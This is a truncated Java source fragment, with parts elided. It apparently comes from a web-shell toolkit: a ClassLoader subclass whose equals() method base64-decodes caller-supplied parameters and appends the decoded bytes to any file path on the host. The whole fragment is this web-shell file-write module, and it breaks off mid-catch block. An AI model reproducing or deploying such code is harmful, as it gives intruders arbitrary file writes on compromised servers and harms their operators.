...
public class file_upload extends ClassLoader
{
    public file_upload(ClassLoader objParent) { super(objParent); }
    public file_upload() { super(file_upload.class.getClassLoader()); }
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            String szFilePath = new String(Base64.getDecoder().decode(z0));
            String szChunkSize = new String(Base64.getDecoder().decode(z1));
            String szChunkData = new String(Base64.getDecoder().decode(z2));

            szChunkData = szChunkData.replace("\r", "").replace("\n", "");

            if (szFilePath.isEmpty())
            {
                fnWriteOutput(objParam, objResponse, osClient, "0".getBytes());
                return true;
            }

            try
            {
                byte[] abBuffer = Base64.getDecoder().decode(szChunkData.trim());
                Files.write(Paths.get(szFilePath), abBuffer, StandardOpenOption.CREATE, StandardOpenOption.APPEND);
                sb.append("1");
            }
            catch (Exception ex)
            {
